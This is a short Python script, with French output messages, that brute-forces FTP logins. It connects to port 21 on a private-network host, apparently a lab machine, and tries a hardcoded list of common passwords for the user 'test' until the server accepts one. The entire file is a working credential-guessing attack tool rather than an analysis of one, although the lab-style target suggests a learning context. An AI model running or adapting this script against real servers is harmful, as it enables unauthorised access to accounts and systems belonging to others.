import socket

class FTPBruteforcer:
    def __init__(self, target, common_passwords):
        self.target = target
        self.common_passwords = common_passwords

    def ftp_bruteforce(self, username):
        nb_test = 0
        for password in self.common_passwords:
            if self._attempt_connection(username, password, nb_test):
                print("Mot de passe trouvé pour FTP:", password)
                return True
            nb_test += 1
        print("Aucun mot de passe trouvé pour FTP.")
        return False

    def _attempt_connection(self, username, password, nb_test):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target, 21))
            response = sock.recv(1024).decode()
            if '220' not in response:
                print("Le serveur FTP n'a pas répondu correctement.")
                return False
            
            sock.sendall(b'USER ' + username.encode() + b'\r\n')
            response = sock.recv(1024).decode()
            if '331' not in response:
                print("Nom d'utilisateur FTP invalide.")
                return False
            
            sock.sendall(b'PASS ' + password.encode() + b'\r\n')
            response = sock.recv(1024).decode()
            if '230' in response:
                print("Connexion réussie avec FTP.")
                sock.sendall(b'QUIT\r\n')
                sock.close()
                return True
            else:
                print(f"Tentative {nb_test + 1}: Échec de la connexion FTP avec le mot de passe '{password}'.")
                sock.sendall(b'QUIT\r\n')
                sock.close()
                return False
        except Exception as e:
            print(f"Tentative {nb_test + 1}: Erreur lors de la tentative de connexion FTP avec le mot de passe '{password}' - Erreur: {e}")
            return False

def main():
    target = "10.0.2.15"
    common_passwords = ["password", "123456", "qwerty", "azerty", "1234", "admin",""]
    bruteforcer = FTPBruteforcer(target, common_passwords)
    bruteforcer.ftp_bruteforce("test")

if __name__ == "__main__":
    main()